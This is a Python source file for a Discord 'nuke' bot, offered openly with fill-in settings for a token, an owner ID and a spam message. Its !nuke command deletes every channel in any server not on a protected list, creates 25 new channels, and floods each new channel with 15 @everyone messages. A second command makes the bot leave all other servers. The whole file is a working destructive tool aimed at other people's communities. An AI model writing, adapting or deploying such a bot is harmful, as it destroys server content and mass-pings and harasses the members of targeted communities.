import discord
from discord.ext import commands
import requests

# ^^ These are libraries , dont remove them!

# Blow is customization stuff, customize your bot

protected_servers = [1317760104182841394] # Add your id
owner_ids = [745716142986756243] # Add your id
nuke_message = "@everyone Your-Message" # Put your nuke message here
nuke_channel_name = "Your-Channel" # Put your nuke channel name here
bot_prefix = "!"

bot_token = ""

# Below is the bot code, Just don't touch it unless you know what you're doing.

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True  
intents.message_content = True  
intents.members = True 

bot = commands.Bot(command_prefix=bot_prefix, intents=intents, help_command=None)


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name} !")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="Bot Commands")
    embed.description = f"""
    :thumbsup: `{bot_prefix}nuke` - Nukes the server
    :crown: `{bot_prefix}fix` - Makes the bot leave all guilds apart from protected servers (OWNER ONLY)
    """
    await ctx.reply(embed=embed)

@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    if guild.id in protected_servers:
        await ctx.reply("This is a protected server.")
        return
    else:
        pass

    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for _ in range(25):
        try:
            await guild.create_text_channel(name=nuke_channel_name)
        except:
            pass

@bot.command()
async def fix(ctx):
    if ctx.message.author.id in owner_ids:
        for guild in bot.guilds:
            if guild.id in protected_servers:
                pass
            else:
                try:
                    await guild.leave()
                except:
                    pass
    else:
        await ctx.reply("This command is an Owner Only command.")
        return
    
@bot.event
async def on_guild_channel_create(channel):
    if channel.guild.id in protected_servers:
        return
    else:
        pass
    for _ in range(15):
        try:
            await channel.send(nuke_message)
        except:
            pass

bot.run(bot_token)
